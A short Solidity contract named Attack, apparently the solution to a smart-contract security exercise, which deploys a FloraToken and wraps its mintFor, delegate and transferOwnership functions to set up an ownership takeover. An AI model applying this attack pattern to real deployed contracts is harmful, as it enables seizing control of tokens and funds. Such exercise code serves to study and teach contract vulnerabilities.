// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/FloraToken.sol";

contract Attack {

    FloraToken public floratoken;
    
    constructor() payable {
        require(msg.value == 1 ether);
        floratoken = new FloraToken{ value : 1 ether}();
    }

    /**@dev This function can only be called by the owner of this contract */

    function mint(address _user, uint256 _amount) external {
        floratoken.mintFor(_user,_amount);

    }
    
    /**@dev must be called by the address (_user) */
    function delegate(address _secondAddress) external {
        floratoken.delegate(_secondAddress);
    }

    /**@dev must  be called by address(_secondAddress)*/

    function transferOwnership(address _user) external {
        floratoken.transferOwnership(_user);
    }
}

 